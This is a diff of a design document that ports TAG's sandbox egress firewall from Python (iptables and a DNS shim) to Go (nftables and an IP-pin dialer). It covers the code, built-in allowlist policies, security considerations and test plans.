-        _ipt("-A", chain, "-j", "LOG",
-             "--log-prefix", f"[TAG-FW:{run_id[:8]}] ", "--log-level", "4")
-        _ipt("-A", chain, "-j", "DROP")
-    else:
-        _ipt("-A", chain, "-j", "RETURN")
-
-    # Register cleanup on exit
-    atexit.register(remove_docker_firewall, chain)
-
-    return chain
-
-
-def remove_docker_firewall(chain: str) -> None:
-    """Remove the sandbox iptables chain. Called on exit or signal."""
-    _ipt("-D", "DOCKER-USER", "-j", chain, check=False)
-    _ipt("-F", chain, check=False)   # flush rules
-    _ipt("-X", chain, check=False)   # delete chain
-```
-
-### 10.6 DNS-Intercept Enforcement (Restricted Subprocess and macOS Fallback)
-
-For the restricted subprocess backend and macOS where iptables is unavailable, enforcement occurs by overriding `socket.getaddrinfo` and `socket.connect` in the subprocess's Python environment:
-
-```python
-# Written to a temp file and injected via PYTHONSTARTUP or exec'd in forked process
-FIREWALL_SHIM_TEMPLATE = """
-import socket as _socket
-import os
-import json
-
-_FIREWALL_SOCKET_PATH = {socket_path!r}
-_ORIGINAL_GETADDRINFO = _socket.getaddrinfo
-_ORIGINAL_CONNECT = _socket.socket.connect
-
-def _tag_check_connection(host, ip, port, proto="tcp"):
-    try:
-        import socket as _s
-        sock = _s.socket(_s.AF_UNIX, _s.SOCK_STREAM)
-        sock.connect(_FIREWALL_SOCKET_PATH)
-        msg = json.dumps({{"host": host, "ip": ip, "port": port, "proto": proto, "pid": os.getpid()}})
-        sock.sendall(msg.encode() + b"\\n")
-        resp = sock.recv(16).decode().strip()
-        sock.close()
-        return resp == "allow"
-    except Exception:
-        return True  # fail open if shim socket unavailable
-
-def _tag_getaddrinfo(host, port, *args, **kwargs):
-    results = _ORIGINAL_GETADDRINFO(host, port, *args, **kwargs)
-    if results:
-        ip = results[0][4][0]
-        if not _tag_check_connection(host, ip, port):
-            raise OSError(111, f"Connection blocked by TAG firewall: {{host}}:{{port}}")
-    return results
-
-_socket.getaddrinfo = _tag_getaddrinfo
-"""
-```
-
-The firewall shim communicates with a Unix domain socket served by a background thread in the TAG process. The server thread receives connection-check requests, evaluates them through `FirewallEngine.evaluate_connection()`, and returns `"allow"` or `"deny"`. This design keeps the evaluation logic in the parent process (where SQLite writes are safe) while the hook runs in the sandboxed subprocess.
-
-### 10.7 Violation Logger Thread
-
-```python
-import queue
-import threading
-import json
-
-class ViolationLogger(threading.Thread):
-    """
-    Background thread that drains a queue of FirewallViolation objects
-    and writes them to SQLite and JSONL without blocking the sandbox.
-    """
-
-    def __init__(
-        self,
-        db_path: str,
-        jsonl_path: str,
-        viol_queue: "queue.Queue[FirewallViolation | None]",
-    ) -> None:
-        super().__init__(daemon=True, name="tag-fw-violation-logger")
-        self._db_path = db_path
-        self._jsonl_path = jsonl_path
-        self._queue = viol_queue
-
-    def run(self) -> None:
-        import sqlite3, uuid
-        conn = sqlite3.connect(self._db_path, timeout=5)
-        conn.execute("PRAGMA journal_mode=WAL")
-        ensure_violations_schema(conn)
-
-        with open(self._jsonl_path, "a") as fh:
-            while True:
-                item = self._queue.get()
-                if item is None:  # poison pill → shutdown
+        if action == ActionAllow { // apply per-invocation denies on top
+            for _, h := range e.cfg.ExtraDenyHosts {
+                if hostname != "" && hostMatches(hostname, h) {
+                    action, triggered = ActionDeny, "deny:invocation:host:"+h
                     break
-                vid = "sfv_" + uuid.uuid4().hex[:8]
-                conn.execute(
-                    """INSERT OR IGNORE INTO sandbox_firewall_violations
-                       (id, run_id, proto, destination_host, destination_ip,
-                        destination_port, triggered_rule, pid, violated_at)
-                       VALUES (?,?,?,?,?,?,?,?,?)""",
-                    (vid, item.run_id, item.proto, item.destination_host,
-                     item.destination_ip, item.destination_port,
-                     item.triggered_rule, item.pid, item.violated_at),
-                )
-                conn.commit()
-                record = {
-                    "id": vid,
-                    "run_id": item.run_id,
-                    "proto": item.proto,
-                    "destination_host": item.destination_host,
-                    "destination_ip": item.destination_ip,
-                    "destination_port": item.destination_port,
-                    "triggered_rule": item.triggered_rule,
-                    "pid": item.pid,
-                    "violated_at": item.violated_at,
                 }
-                fh.write(json.dumps(record) + "\n")
-                fh.flush()
+            }
+            if action == ActionAllow && cidrHit(e.cfg.ExtraDenyCIDRs) {
+                action, triggered = ActionDeny, "deny:invocation:cidr"
+            }
+        }
+    }
+
+    if action == ActionDeny {
+        v := FirewallViolation{
+            RunID: e.runID, DestinationIP: ip, DestinationHost: hostname,
+            DestinationPort: port, Proto: proto, TriggeredRule: triggered, PID: pid,
+            ViolatedAt: time.Now().UTC().Format(time.RFC3339),
+        }
+        select {
+        case e.viol <- v: // non-blocking send (buffered)
+        default:
+        }
+    }
+    return action
+}
+
+func hostMatches(hostname, pattern string) bool {
+    if pattern == "*" {
+        return true
+    }
+    if strings.HasPrefix(pattern, "*.") {
+        return strings.HasSuffix(hostname, pattern[1:]) || hostname == pattern[2:]
+    }
+    return strings.EqualFold(hostname, pattern)
+}
+
+func (e *FirewallEngine) findTriggeredRule(hostname, ip string, action FirewallAction) string {
+    rules := e.cfg.Policy.DenyRules
+    if action == ActionAllow {
+        rules = e.cfg.Policy.AllowRules
+    }
+    sorted := append([]FirewallRule(nil), rules...)
+    sort.SliceStable(sorted, func(i, j int) bool { return sorted[i].Priority < sorted[j].Priority })
+    for i := range sorted {
+        if (hostname != "" && sorted[i].MatchesHost(hostname)) || sorted[i].MatchesIP(ip) {
+            return fmt.Sprintf("%s:%s:%s", sorted[i].Action, sorted[i].Type, sorted[i].Value)
+        }
+    }
+    return string(action) + ":default"
+}
+```
+
+### 10.5 Host-Level nftables Enforcement (Docker Backend)
+
+The Python `subprocess.run(["iptables", ...])` shell-out is replaced by programmatic rule construction over `google/nftables` (pure-Go netlink, no CLI, no CGO). A per-sandbox chain is added to the host inet table ahead of Docker's chains; CIDR allow rules `accept`, CIDR deny rules `log` + `drop`, and the default action is the chain's policy. Teardown deletes the chain. Any nftables error returns `nil` so the caller can fall back to the netguard dialer (FR-17).
+
+```go
+//go:build linux
+
+package sandbox
+
+import (
+    "fmt"
+    "net/netip"
+    "sort"
+
+    "github.com/google/nftables"
+    "github.com/google/nftables/expr"
+)
+
+const chainPrefix = "TAG-SBX-"
+
+// ApplyDockerFirewall programs a per-sandbox nftables chain for containerID.
+// Returns the chain name, or "" if nftables is unavailable (caller falls back).
+func ApplyDockerFirewall(runID string, policy FirewallPolicy, containerID string) (string, error) {
+    conn, err := nftables.New()
+    if err != nil {
+        return "", err // nftables unavailable → caller uses netguard dialer
+    }
+    table := conn.AddTable(&nftables.Table{Family: nftables.TableFamilyINet, Name: "tag_fw"})
+    chainName := chainPrefix + runID[:8]
+    chain := conn.AddChain(&nftables.Chain{
+        Name: chainName, Table: table,
+        Type: nftables.ChainTypeFilter, Hooknum: nftables.ChainHookForward,
+        Priority: nftables.ChainPriorityFilter,
+    })
+
+    add := func(cidr string, verdict expr.VerdictKind, log bool) {
+        p, err := netip.ParsePrefix(cidr)
+        if err != nil {
+            return
+        }
+        exprs := daddrMatch(p) // build payload+cmp exprs for the destination prefix
+        if log {
+            exprs = append(exprs, &expr.Log{Data: []byte(fmt.Sprintf("[TAG-FW:%s] ", runID[:8]))})
+        }
+        exprs = append(exprs, &expr.Verdict{Kind: verdict})
+        conn.AddRule(&nftables.Rule{Table: table, Chain: chain, Exprs: exprs})
+    }
+
+    sortByPriority(policy.AllowRules)
+    for _, r := range policy.AllowRules {
+        if r.Type == RuleCIDR {
+            add(r.Value, expr.VerdictAccept, false)
+        }
+    }
+    sortByPriority(policy.DenyRules)
+    for _, r := range policy.DenyRules {
+        if r.Type == RuleCIDR {
+            add(r.Value, expr.VerdictDrop, true)
+        }
+    }
+    // Default policy at end of chain
+    if policy.DefaultAction == ActionDeny {
+        conn.AddRule(&nftables.Rule{Table: table, Chain: chain, Exprs: []expr.Any{
+            &expr.Log{Data: []byte(fmt.Sprintf("[TAG-FW:%s] ", runID[:8]))},
+            &expr.Verdict{Kind: expr.VerdictDrop},
+        }})
+    }
+    if err := conn.Flush(); err != nil { // commit the netlink batch
+        return "", err
+    }
+    return chainName, nil
+}
+
+// RemoveDockerFirewall deletes the per-sandbox chain. Called via defer / signal.
+func RemoveDockerFirewall(chainName string) {
+    conn, err := nftables.New()
+    if err != nil {
+        return
+    }
+    table := &nftables.Table{Family: nftables.TableFamilyINet, Name: "tag_fw"}
+    conn.DelChain(&nftables.Chain{Name: chainName, Table: table})
+    _ = conn.Flush()
+}
+
+func sortByPriority(rs []FirewallRule) {
+    sort.SliceStable(rs, func(i, j int) bool { return rs[i].Priority < rs[j].Priority })
+}
+```
+
+### 10.6 Userspace IP-Pin Dialer Enforcement (Restricted Subprocess and off-Linux Fallback)
+
+The Python DNS-intercept shim (monkeypatching `socket.getaddrinfo`, a `PYTHONSTARTUP` script, and a Unix-domain-socket check server) is a Python-runtime-specific hack that does **not** port to a static Go binary. It is replaced by `internal/netguard`'s connect-time IP-pin dialer: a `DialContext` that resolves the destination, pins the resolved IP, evaluates it through `FirewallEngine.EvaluateConnection`, and only then connects — the same "connect-time IP-pin + redirect-revalidate" primitive TAG already uses for SSRF protection. For the restricted-subprocess backend, the child's outbound traffic is routed through this dialer (or a loopback proxy backed by it); for container tiers where no host nftables is available, the gVisor netstack (runsc) provides a fully userspace network stack. Where neither can be applied (an arbitrary non-Go subprocess making raw syscalls), TAG prints a documented reduced-enforcement warning (see §11).
+
+```go
+package netguard
+
+import (
+    "context"
+    "fmt"
+    "net"
+)
+
+// FirewallDialer returns a DialContext that pins and validates the destination
+// IP against the active policy before connecting (replaces the Python DNS shim).
+func FirewallDialer(engine *sandbox.FirewallEngine, pid int) func(context.Context, string, string) (net.Conn, error) {
+    base := &net.Dialer{}
+    return func(ctx context.Context, network, address string) (net.Conn, error) {
+        host, portStr, _ := net.SplitHostPort(address)
+        ips, err := net.DefaultResolver.LookupNetIP(ctx, "ip", host)
+        if err != nil || len(ips) == 0 {
+            return nil, fmt.Errorf("resolve %s: %w", host, err)
+        }
+        ip := ips[0] // pinned IP — connection is made to exactly this address
+        port := atoiSafe(portStr)
+        if engine.EvaluateConnection(host, ip.String(), port, network, pid) == sandbox.ActionDeny {
+            return nil, fmt.Errorf("connection blocked by TAG firewall: %s:%d", host, port)
+        }
+        return base.DialContext(ctx, network, net.JoinHostPort(ip.String(), portStr))
+    }
+}
+```
+
+Because evaluation runs in-process (same address space as the SQLite writer goroutine), there is no cross-process check server to secure — a structural simplification over the Python Unix-socket design.
+
+### 10.7 Violation Logger Goroutine
+
+The Python daemon `threading.Thread` + `queue.Queue` + poison-pill becomes a goroutine ranging over a buffered channel; closing the channel (instead of a `None` sentinel) signals shutdown. SQLite writes go through the `modernc.org/sqlite` driver in WAL mode.
+
+```go
+package sandbox
+
+import (
+    "database/sql"
+    "encoding/json"
+    "os"
+    "sync"
+
+    _ "modernc.org/sqlite"
+)
+
+// ViolationLogger drains a buffered channel of FirewallViolation and writes
+// each to SQLite + JSONL without blocking the enforcement path.
+type ViolationLogger struct {
+    dbPath, jsonlPath string
+    ch                <-chan FirewallViolation
+    done              sync.WaitGroup
+}
+
+func StartViolationLogger(dbPath, jsonlPath string, ch <-chan FirewallViolation) *ViolationLogger {
+    l := &ViolationLogger{dbPath: dbPath, jsonlPath: jsonlPath, ch: ch}
+    l.done.Add(1)
+    go l.run()
+    return l
+}
+
+func (l *ViolationLogger) run() {
+    defer l.done.Done()
+
+    db, err := sql.Open("sqlite", l.dbPath+"?_pragma=busy_timeout(5000)&_pragma=journal_mode(WAL)")
+    if err != nil {
+        return
+    }
+    defer db.Close()
+    ensureViolationsSchema(db)
+
+    fh, err := os.OpenFile(l.jsonlPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
+    if err != nil {
+        return
+    }
+    defer fh.Close()
+
+    enc := json.NewEncoder(fh)
+    for v := range l.ch { // ranges until the channel is closed (shutdown signal)
+        v.ID = "sfv_" + randHex(8)
+        _, _ = db.Exec(
+            `INSERT OR IGNORE INTO sandbox_firewall_violations
+               (id, run_id, proto, destination_host, destination_ip,
+                destination_port, triggered_rule, pid, violated_at)
+             VALUES (?,?,?,?,?,?,?,?,?)`,
+            v.ID, v.RunID, v.Proto, v.DestinationHost, v.DestinationIP,
+            v.DestinationPort, v.TriggeredRule, v.PID, v.ViolatedAt)
+        _ = enc.Encode(v) // one JSON object per line, flushed by the file writer
+    }
+}
+
+// Wait blocks until the channel is closed and all pending violations are flushed.
+func (l *ViolationLogger) Wait() { l.done.Wait() }
 ```
 
 ### 10.8 Built-in Named Policies
 
-Built-in policies are defined as Python constants and seeded into SQLite on first `ensure_firewall_schema()` call:
+Built-in policies are defined as Go package-level values and seeded into SQLite with `INSERT OR IGNORE` on the first `internal/store` migration:
 
-```python
-BUILTIN_POLICIES: dict[str, dict] = {
+```go
+package sandbox
+
+type builtinRule struct {
+    Action FirewallAction
+    Type   RuleType
+    Value  string
+}
+
+type builtinPolicy struct {
+    DefaultAction FirewallAction
+    Description   string
+    Rules         []builtinRule
+}
+
+var BuiltinPolicies = map[string]builtinPolicy{
     "open": {
-        "default_action": "allow",
-        "description": "No restrictions — allow all egress (default behaviour).",
-        "rules": [],
+        DefaultAction: ActionAllow,
+        Description:   "No restrictions — allow all egress (default behaviour).",
     },
     "restricted": {
-        "default_action": "deny",
-        "description": "Deny all egress. No hosts allowed by default.",
-        "rules": [],
+        DefaultAction: ActionDeny,
+        Description:   "Deny all egress. No hosts allowed by default.",
     },
     "pypi": {
-        "default_action": "deny",
-        "description": "Allow PyPI, GitHub, and common Linux package CDNs.",
-        "rules": [
-            ("allow", "host",     "pypi.org"),
-            ("allow", "host",     "files.pythonhosted.org"),
-            ("allow", "host",     "api.github.com"),
-            ("allow", "host",     "github.com"),
-            ("allow", "wildcard", "*.github.com"),
-            ("allow", "wildcard", "*.githubusercontent.com"),
-            ("allow", "host",     "cdn.jsdelivr.net"),
-            ("allow", "host",     "registry.npmjs.org"),
-            ("allow", "host",     "registry.yarnpkg.com"),
-            ("allow", "host",     "dl-cdn.alpinelinux.org"),
-            ("allow", "host",     "deb.debian.org"),
-            ("allow", "host",     "security.debian.org"),
-            ("allow", "host",     "archive.ubuntu.com"),
-            ("allow", "host",     "security.ubuntu.com"),
-            ("allow", "wildcard", "*.cloudfront.net"),
-        ],
+        DefaultAction: ActionDeny,
+        Description:   "Allow PyPI, GitHub, and common Linux package CDNs.",
+        Rules: []builtinRule{
+            {ActionAllow, RuleHost, "pypi.org"},
+            {ActionAllow, RuleHost, "files.pythonhosted.org"},
+            {ActionAllow, RuleHost, "api.github.com"},
+            {ActionAllow, RuleHost, "github.com"},
+            {ActionAllow, RuleWildcard, "*.github.com"},
+            {ActionAllow, RuleWildcard, "*.githubusercontent.com"},
+            {ActionAllow, RuleHost, "cdn.jsdelivr.net"},
+            {ActionAllow, RuleHost, "registry.npmjs.org"},
+            {ActionAllow, RuleHost, "registry.yarnpkg.com"},
+            {ActionAllow, RuleHost, "dl-cdn.alpinelinux.org"},
+            {ActionAllow, RuleHost, "deb.debian.org"},
+            {ActionAllow, RuleHost, "security.debian.org"},
+            {ActionAllow, RuleHost, "archive.ubuntu.com"},
+            {ActionAllow, RuleHost, "security.ubuntu.com"},
+            {ActionAllow, RuleWildcard, "*.cloudfront.net"},
+        },
     },
     "custom": {
-        "default_action": "allow",
-        "description": "User-defined policy (empty placeholder — add rules with firewall add).",
-        "rules": [],
+        DefaultAction: ActionAllow,
+        Description:   "User-defined policy (empty placeholder — add rules with firewall add).",
     },
 }
 ```
 
-### 10.9 Integration with `run_in_sandbox()`
+### 10.9 Integration with the sandbox `Run` path
 
-The existing `run_in_sandbox()` function in `sandbox.py` is extended to accept a `firewall_config: Optional[SandboxFirewallConfig]` parameter:
+The sandbox `Spec` (PRD-093 §10.3) gains an optional `*SandboxFirewallConfig`; the logger goroutine is started before enforcement and stopped by closing the channel. Chain teardown / logger shutdown run via `defer` so they fire on every exit path including panic (FR-05).
 
-```python
-def run_in_sandbox(
-    conn: sqlite3.Connection,
-    command_str: str,
-    *,
-    backend: str = "restricted",
-    image: str = "python:3.12-slim",
-    timeout: int = 60,
-    workdir: Path | None = None,
-    firewall_config: Optional[SandboxFirewallConfig] = None,  # NEW
-) -> dict:
-    ...
-    viol_queue: queue.Queue[FirewallViolation | None] = queue.Queue()
-    if firewall_config is not None:
-        db_path = str(Path.home() / ".tag" / "runtime" / "tag.sqlite3")
-        jsonl_path = str(Path.home() / ".tag" / "runtime" / "sandbox-firewall.jsonl")
-        logger = ViolationLogger(db_path, jsonl_path, viol_queue)
-        logger.start()
+```go
+func RunWithFirewall(ctx context.Context, backend Backend, spec Spec, fw *SandboxFirewallConfig) (Result, error) {
+    runID := spec.InvokingRunID
+    if fw == nil {
+        return backend.Run(ctx, spec) // no firewall requested
+    }
 
-    try:
-        if backend == "docker":
-            exit_code, stdout, stderr = _run_docker(
-                cmd, image, timeout=timeout, firewall_config=firewall_config,
-                run_id=run_id, viol_queue=viol_queue
-            )
-        else:
-            exit_code, stdout, stderr = _run_restricted(
-                cmd, timeout=timeout, workdir=workdir,
-                firewall_config=firewall_config, run_id=run_id,
-                viol_queue=viol_queue
-            )
-    finally:
-        if firewall_config is not None:
-            viol_queue.put(None)   # signal logger to stop
-            logger.join(timeout=3)
+    viol := make(chan FirewallViolation, 256) // buffered → non-blocking sends
+    dbPath := filepath.Join(tagHome(), "runtime", "tag.sqlite3")
+    jsonlPath := filepath.Join(tagHome(), "runtime", "sandbox-firewall.jsonl")
+    logger := StartViolationLogger(dbPath, jsonlPath, viol)
+    defer func() { close(viol); logger.Wait() }() // shutdown signal + drain
+
+    engine := NewFirewallEngine(*fw, viol, runID)
+
+    switch backend.Name() {
+    case "docker":
+        chain, err := ApplyDockerFirewall(runID, fw.Policy, "" /* container id set at start */)
+        if err == nil && chain != "" {
+            defer RemoveDockerFirewall(chain) // unconditional teardown
+        } else {
+            // nftables unavailable → fall back to the netguard dialer (FR-17)
+            spec = spec.WithDialer(netguard.FirewallDialer(engine, 0))
+        }
+    default: // restricted-subprocess and off-Linux
+        spec = spec.WithDialer(netguard.FirewallDialer(engine, 0))
+    }
+    return backend.Run(ctx, spec)
+}
 ```
+
+Signal-driven cleanup is anchored at the process root via `signal.NotifyContext(ctx, os.Interrupt, syscall.SIGTERM)`; cancelling that context unwinds the `defer RemoveDockerFirewall` on SIGINT/SIGTERM as well as normal return.
 
 ### 10.10 Profile YAML Integration
 
@@ -969,21 +1020,21 @@ execution:
   # OR: network: restricted|open|pypi|custom
 ```
 
-Profile loading in `controller.py` calls `load_firewall_policy_for_profile(conn, profile_name)` which queries `sandbox_firewall_policies` and `sandbox_firewall_rules` to build a `FirewallPolicy` object.
+The profile YAML is parsed by `internal/config` (koanf + yaml.v3). Profile loading in `internal/cli` calls `LoadFirewallPolicyForProfile(ctx, db, profileName)` which queries `sandbox_firewall_policies` and `sandbox_firewall_rules` (via `internal/store`) to build a `FirewallPolicy`.
 
 ---
 
 ## 11. Security Considerations
 
-1. **Chain cleanup is safety-critical.** Orphaned iptables chains containing DROP rules can permanently block outbound traffic from subsequent Docker containers that happen to share a bridge. The cleanup path is registered with both `atexit.register()` and `signal.signal(SIGTERM/SIGINT)` handlers. The chain name `TAG-SBX-<run_id[:8]>` is unique per run; a `tag sandbox firewall purge` command performs garbage collection of any stale chains.
+1. **Chain cleanup is safety-critical.** Orphaned nftables chains containing drop rules can permanently block outbound traffic from subsequent Docker containers that happen to share a bridge. The cleanup path is anchored with `defer RemoveDockerFirewall(...)` plus a `signal.NotifyContext(SIGTERM/SIGINT)` root context so it runs on every exit path including panic. The chain name `TAG-SBX-<run_id[:8]>` is unique per run; a `tag sandbox firewall purge` command performs garbage collection of any stale chains.
 
-2. **Localhost CIDR is never blocked.** `FirewallRule.validate()` rejects rules whose CIDR range contains `127.0.0.0/8` or `::1/128`. Blocking localhost inside the sandbox breaks Python's `multiprocessing`, `asyncio` local sockets, and package managers that use localhost proxies.
+2. **Localhost CIDR is never blocked.** `FirewallRule.Validate()` rejects rules whose CIDR range contains `127.0.0.0/8` or `::1/128`. Blocking localhost inside the sandbox breaks local IPC sockets, loopback services, and package managers that use localhost proxies.
 
 3. **Violation log does not record payload data.** `FirewallViolation` records destination host, IP, port, and rule — never the content of the blocked request. This prevents the violation log from becoming a secondary exfiltration channel (e.g., a process leaking data via DNS query names).
 
-4. **DNS intercept shim is scoped to subprocess only.** The `PYTHONSTARTUP` injection only affects the sandboxed subprocess's Python interpreter; it does not affect the TAG parent process. The Unix socket used for evaluation is bound to a randomly-named temp path with permissions `0o600`.
+4. **Enforcement runs in-process — no injected shim.** The netguard IP-pin dialer evaluates connections inside the TAG process's address space; there is no Python interpreter to monkeypatch, no `PYTHONSTARTUP` injection, and no cross-process Unix-socket check server to secure — removing an entire class of shim-tampering and socket-permission concerns present in the Python design.
 
-5. **iptables requires root or `CAP_NET_ADMIN`.** TAG's Docker backend invokes iptables commands as the user running `tag`. On systems where the user does not have `CAP_NET_ADMIN` (non-root without sudo), iptables enforcement silently falls back to DNS intercept with a printed warning. This fallback is weaker (user-space only, bypassable by a process that re-implements raw socket calls) and is documented as such.
+5. **nftables requires `CAP_NET_ADMIN`.** TAG's Docker backend programs nftables via netlink as the user running `tag`. Where the user lacks `CAP_NET_ADMIN` (non-root without sudo) or nftables is unavailable, enforcement falls back to the netguard connect-time IP-pin dialer with a printed warning. That fallback is weaker (userspace only, bypassable by a process that issues raw `connect(2)` syscalls outside the Go dialer — e.g. via a C extension) and is documented as such; gVisor netstack is the stronger container-tier option.
 
 6. **Wildcard rules are limited to single-level prefix matching.** `*.github.com` matches `api.github.com` but not `evil.api.github.com` to prevent overly broad allow rules. Users who need deeper wildcard matching must enumerate each prefix explicitly.
 
@@ -993,7 +1044,7 @@ Profile loading in `controller.py` calls `load_firewall_policy_for_profile(conn,
 
 9. **Log file permissions.** `sandbox-firewall.jsonl` is created with mode `0o600` (owner-readable only). The SQLite database already uses `0o600` via TAG's `open_db()`. Violation data (destination IPs) could reveal browsing/API patterns and must not be world-readable.
 
-10. **iptables LOG target requires kernel module.** The `LOG` target (used to capture kernel-level violation events alongside the user-space shim) requires the `ipt_LOG` kernel module. If unavailable, only `DROP` rules are applied; kernel-level logging is omitted. The user-space shim's violation log is unaffected.
+10. **nftables log statement requires kernel support.** The nftables `log` statement (used to capture kernel-level violation events alongside the userspace dialer) requires `nf_log` support in the kernel. If unavailable, only `drop` rules are applied; kernel-level logging is omitted. The userspace dialer's violation log is unaffected.
 
 ---
 
@@ -1001,56 +1052,54 @@ Profile loading in `controller.py` calls `load_firewall_policy_for_profile(conn,
 
 ### 12.1 Unit Tests
 
-File: `tests/test_sandbox_firewall.py`
+File: `internal/sandbox/firewall_test.go` — Go standard `testing`, table-driven.
 
 | Test | Method |
 |------|--------|
-| `FirewallRule.validate()` accepts valid CIDRs | `pytest.mark.parametrize` over valid CIDR strings |
-| `FirewallRule.validate()` rejects malformed CIDRs | Assert `ValueError` for `"10.0.x.y/24"`, `"999.0.0.0/8"`, `""` |
-| `FirewallRule.validate()` rejects localhost CIDRs | Assert `ValueError` for `"127.0.0.1/32"`, `"127.0.0.0/8"` |
-| `FirewallRule.matches_host()` — exact match | `api.github.com` matches `api.github.com` |
-| `FirewallRule.matches_host()` — wildcard match | `api.github.com` matches `*.github.com` |
-| `FirewallRule.matches_host()` — wildcard non-match | `evil.api.github.com` does NOT match `*.github.com` |
-| `FirewallRule.matches_ip()` — in range | `10.0.0.5` matches `10.0.0.0/8` |
-| `FirewallRule.matches_ip()` — outside range | `192.168.1.1` does not match `10.0.0.0/8` |
-| `FirewallPolicy.evaluate()` — allow wins over deny-all | Allow rule for host, deny-all CIDR: returns ALLOW |
-| `FirewallPolicy.evaluate()` — default deny with no matching rule | Returns DENY |
-| `FirewallPolicy.evaluate()` — default allow with no matching deny | Returns ALLOW |
-| `FirewallEngine.evaluate_connection()` — deny-all + per-invocation allow | Specific host allowed, others denied |
-| `FirewallEngine.evaluate_connection()` — violation queued on deny | `viol_queue.qsize() == 1` after blocked call |
-| `BUILTIN_POLICIES` keys — all four present and valid | Smoke test |
-| `_host_matches()` — star pattern | `*` matches any host |
+| `FirewallRule.Validate` accepts valid CIDRs | Table of valid CIDR strings; assert `err == nil` |
+| `FirewallRule.Validate` rejects malformed CIDRs | Assert non-nil `error` for `"10.0.x.y/24"`, `"999.0.0.0/8"`, `""` |
+| `FirewallRule.Validate`/policy save rejects localhost CIDRs | Assert error for `"127.0.0.1/32"`, `"127.0.0.0/8"` |
+| `FirewallRule.MatchesHost` — exact match | `api.github.com` matches `api.github.com` |
+| `FirewallRule.MatchesHost` — wildcard match | `api.github.com` matches `*.github.com` |
+| `FirewallRule.MatchesHost` — wildcard non-match | `evil.api.github.com` does NOT match `*.github.com` |
+| `FirewallRule.MatchesIP` — in range | `10.0.0.5` matches `10.0.0.0/8` (via `netip.Prefix.Contains`) |
+| `FirewallRule.MatchesIP` — outside range | `192.168.1.1` does not match `10.0.0.0/8` |
+| `FirewallPolicy.Evaluate` — allow wins over deny-all | Allow rule for host, deny-all CIDR: returns `ActionAllow` |
+| `FirewallPolicy.Evaluate` — default deny with no matching rule | Returns `ActionDeny` |
+| `FirewallPolicy.Evaluate` — default allow with no matching deny | Returns `ActionAllow` |
+| `FirewallEngine.EvaluateConnection` — deny-all + per-invocation allow | Specific host allowed, others denied |
+| `FirewallEngine.EvaluateConnection` — violation sent on deny | Receive one `FirewallViolation` from the channel after a blocked call |
+| `BuiltinPolicies` keys — all four present and valid | Smoke test |
+| `hostMatches` — star pattern | `*` matches any host |
 
 ### 12.2 Integration Tests
 
-File: `tests/test_sandbox_firewall_integration.py`
-
-These tests require Docker and run only when `DOCKER_AVAILABLE=1` in the environment:
+File: `internal/sandbox/firewall_integration_test.go`, gated by `//go:build integration` and skipped unless Docker/nftables are available (env-guarded):
 
 | Test | Method |
 |------|--------|
-| DNS intercept blocks denied host | Start restricted sandbox with `--deny-host httpbin.org`; run `python -c "import socket; socket.getaddrinfo('httpbin.org', 80)"`; assert exit code 1 and violation logged |
-| DNS intercept allows permitted host | Same setup with `--allow-host pypi.org --deny-all`; `getaddrinfo('pypi.org', 443)` succeeds |
-| iptables chain created and removed | After Docker sandbox run with `--deny-all`, assert chain `TAG-SBX-<id>` absent from `iptables -L` |
+| netguard dialer blocks denied host | Run restricted sandbox with `--deny-host httpbin.org`; a `DialContext` to `httpbin.org:80` returns an error; assert violation logged |
+| netguard dialer allows permitted host | Same setup with `--allow-host pypi.org --deny-all`; dial to `pypi.org:443` succeeds |
+| nftables chain created and removed | After Docker sandbox run with `--deny-all`, assert chain `TAG-SBX-<id>` absent when listing the `tag_fw` table via `google/nftables` |
 | Violation row written to SQLite | Run sandbox with blocked destination; query `sandbox_firewall_violations` by `run_id`; assert 1 row |
-| Violation row written to JSONL | Same run; tail `sandbox-firewall.jsonl`; parse JSON; assert `destination_ip` field present |
+| Violation row written to JSONL | Same run; read `sandbox-firewall.jsonl`; decode JSON; assert `destination_ip` present |
 | `pypi` policy allows `pip install` | `tag sandbox run --network pypi --code "pip install requests --quiet"` exits 0 |
 | `restricted` policy blocks all | `tag sandbox run --network restricted --code "curl https://example.com"` exits non-zero; violation logged |
-| `firewall test` dry-run no TCP connection | `tag sandbox firewall test --policy restricted --destination api.github.com` produces BLOCKED; no actual connection made (verify with `strace` or mock) |
-| Chain cleanup on SIGINT | Send SIGINT during sandbox run; assert chain absent from iptables after 2 seconds |
-| `ViolationLogger` thread shutdown | Put `None` on queue; assert `logger.is_alive() == False` within 1 second |
+| `firewall test` dry-run no TCP connection | `tag sandbox firewall test --policy restricted --destination api.github.com` produces BLOCKED; assert only a DNS lookup, no `Dial` (inject a fake dialer that records calls) |
+| Chain cleanup on SIGINT | Cancel the root `signal.NotifyContext` during a run; assert chain absent within 2s |
+| `ViolationLogger` goroutine shutdown | Close the channel; assert `logger.Wait()` returns within 1s |
 
 ### 12.3 Performance Tests
 
-File: `tests/perf/test_sandbox_firewall_perf.py`
+File: `internal/sandbox/firewall_bench_test.go` — Go benchmarks (`go test -bench`).
 
 | Test | Target | Method |
 |------|--------|--------|
-| Firewall startup overhead (Docker) | < 200 ms | Time 50 `apply_docker_firewall()` calls; assert p95 < 200 ms |
-| Firewall startup overhead (DNS shim) | < 10 ms | Time 50 shim injections; assert p95 < 10 ms |
-| `evaluate_connection()` throughput | > 100,000 evaluations/sec | `timeit` loop; 10-rule policy |
-| Violation logger throughput | > 5,000 violations/sec | Flood queue with 10,000 violations; measure flush time |
-| Chain removal latency | < 1 s for 1000-rule chain | Benchmark `remove_docker_firewall()` with 1000-rule chain |
+| Firewall startup overhead (Docker/nftables) | < 200 ms | Benchmark 50 `ApplyDockerFirewall` calls; assert p95 < 200 ms |
+| Firewall startup overhead (netguard dialer) | < 10 ms | Benchmark 50 dialer setups; assert p95 < 10 ms |
+| `EvaluateConnection` throughput | > 100,000 evaluations/sec | `BenchmarkEvaluateConnection` with a 10-rule policy |
+| Violation logger throughput | > 5,000 violations/sec | Flood the channel with 10,000 violations; measure flush time |
+| Chain removal latency | < 1 s for 1000-rule chain | Benchmark `RemoveDockerFirewall` with a 1000-rule chain |
 
 ---
 
@@ -1066,13 +1115,13 @@ File: `tests/perf/test_sandbox_firewall_perf.py`
 | AC-06 | `tag sandbox firewall test --policy pypi --destination pypi.org` prints "Result: ALLOWED". | CLI test |
 | AC-07 | Every blocked connection in a Docker sandbox produces a row in `sandbox_firewall_violations` with correct `run_id`, `destination_ip`, `triggered_rule`, and `violated_at`. | SQLite assertion test |
 | AC-08 | Every blocked connection produces a valid JSON object appended to `sandbox-firewall.jsonl` within 500 ms. | File assertion test |
